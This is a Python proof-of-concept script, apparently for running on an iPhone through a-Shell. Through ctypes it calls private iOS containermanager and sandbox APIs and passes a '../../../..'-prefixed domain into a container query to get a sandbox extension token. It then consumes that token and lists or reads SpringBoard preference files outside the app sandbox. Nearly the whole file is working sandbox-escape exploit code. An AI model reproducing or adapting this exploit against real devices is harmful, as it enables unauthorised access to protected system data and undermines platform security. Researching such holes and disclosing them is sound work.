#!/usr/bin/env python3
"""
bad_query sandbox extension probe.
Tests whether the path-traversal in containermanagerd_system can reach
SpringBoard library paths on iOS 26.6.1.

Run from a-Shell on device.
"""
import ctypes as C
import threading, os

cm   = C.CDLL('/usr/lib/system/libsystem_containermanager.dylib')
xpc  = C.CDLL('/usr/lib/system/libxpc.dylib')
libc = C.CDLL('/usr/lib/libSystem.B.dylib')

cm.container_query_create.restype                    = C.c_void_p
cm.container_query_create.argtypes                   = []
cm.container_query_set_class.restype                 = None
cm.container_query_set_class.argtypes                = [C.c_void_p, C.c_uint64]
cm.container_query_set_group_identifiers.restype     = None
cm.container_query_set_group_identifiers.argtypes    = [C.c_void_p, C.c_void_p]
cm.container_query_operation_set_flags.restype       = None
cm.container_query_operation_set_flags.argtypes      = [C.c_void_p, C.c_uint64]
cm.container_query_operation_set_part.restype        = None
cm.container_query_operation_set_part.argtypes       = [C.c_void_p, C.c_uint64]
cm.container_query_operation_set_part_domain.restype  = None
cm.container_query_operation_set_part_domain.argtypes = [C.c_void_p, C.c_char_p]
cm.container_query_get_single_result.restype         = C.c_void_p
cm.container_query_get_single_result.argtypes        = [C.c_void_p]
cm.container_query_free.restype                      = None
cm.container_query_free.argtypes                     = [C.c_void_p]
cm.container_copy_sandbox_token.restype              = C.c_char_p
cm.container_copy_sandbox_token.argtypes             = [C.c_void_p]

xpc.xpc_string_create.restype  = C.c_void_p
xpc.xpc_string_create.argtypes = [C.c_char_p]
xpc.xpc_release.restype        = None
xpc.xpc_release.argtypes       = [C.c_void_p]

libc.sandbox_extension_consume.restype  = C.c_int64
libc.sandbox_extension_consume.argtypes = [C.c_char_p]
libc.sandbox_extension_release.restype  = C.c_int
libc.sandbox_extension_release.argtypes = [C.c_int64]

# Paths to test (ascending ambition)
TESTS = [
    b'/var/mobile/Library/Preferences',
    b'/var/mobile/Library/SpringBoard',
    b'/var/mobile/Library/SpringBoard/statusBarOverridesEditing',
    b'/var/mobile/Library/Preferences/com.apple.springboard.plist',
]

def probe(path):
    out = {'result': None, 'token': None, 'handle': None, 'err': None}
    def _run():
        try:
            q = cm.container_query_create()
            if not q:
                out['err'] = 'create failed'; return
            cm.container_query_set_class(q, 13)
            ident = xpc.xpc_string_create(b'systemgroup.com.apple.mobilegestaltcache')
            cm.container_query_set_group_identifiers(q, ident)
            cm.container_query_operation_set_part(q, 3)
            domain = b'../../../../../../../..' + path
            cm.container_query_operation_set_part_domain(q, domain)
            cm.container_query_operation_set_flags(q, 0x0000008000000000)
            res = cm.container_query_get_single_result(q)
            out['result'] = res
            if res:
                tok = cm.container_copy_sandbox_token(res)
                out['token'] = tok
                if tok:
                    out['handle'] = libc.sandbox_extension_consume(tok)
            xpc.xpc_release(ident)
            cm.container_query_free(q)
        except Exception as e:
            out['err'] = str(e)
    t = threading.Thread(target=_run, daemon=True)
    t.start(); t.join(timeout=5)
    return out

for path in TESTS:
    print(f'\n=== {path.decode()} ===')
    r = probe(path)
    print(f'  query result ptr : {hex(r["result"] or 0)}')
    print(f'  token            : {r["token"]}')
    print(f'  handle           : {r["handle"]}')
    if r['err']:
        print(f'  err              : {r["err"]}')
    h = r['handle']
    if h is not None and h >= 0:
        p = path.decode()
        if os.path.isdir(p):
            try:    print(f'  ls               : {os.listdir(p)[:10]}')
            except Exception as e: print(f'  ls err           : {e}')
        else:
            try:
                with open(p, 'rb') as f:
                    data = f.read(128)
                print(f'  read (128B)      : {data}')
            except Exception as e:
                print(f'  read err         : {e}')
        libc.sandbox_extension_release(h)

print('\ndone')
